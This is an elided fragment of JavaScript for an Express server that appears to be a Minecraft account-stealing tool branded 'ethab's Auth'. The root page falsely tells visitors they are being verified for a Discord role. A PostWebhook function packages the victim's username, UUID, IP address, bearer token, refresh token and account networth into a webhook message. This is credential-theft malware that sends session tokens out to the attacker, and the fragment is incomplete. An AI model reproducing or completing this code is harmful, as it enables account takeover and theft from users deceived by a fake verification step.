...
app.get('/', async (req, res) => {
    ...
    res.send('You have been verified. It may take a few minutes for you to successfully receive your role. Please wait whilst our powerful system gives fetches your roles.')
});
...
function PostWebhook(refresh, username, uuid, ip, BearerToken, refresh_token, networth, soulboundnetworth, description) {
    ...
    let data = {
        "username": "ethab's Auth",
        "avatar_url": "https://exoticfruitbox.com/wp-content/uploads/2015/10/mango.jpg",
        "embeds": [
            {
            "title": "ethab's Auth",
            ...
            footer: {
                    "text": "🌟 ethab's Auth by ethab v3#9402 🌟",
                    "url": "https://exoticfruitbox.com/wp-content/uploads/2015/10/mango.jpg"
            },
            timestamp: new Date(),
            "fields": [
                {
    ...
    if (description != "No profile data found. 🙁") {
        embed.embeds.push({
            ...
            footer: {
                "text": "🌟 ethab's Auth ethab 🌟 - Thank you BreadCat for your networth stuff!",
            }
        })
    } else {
        embed.embeds.push({
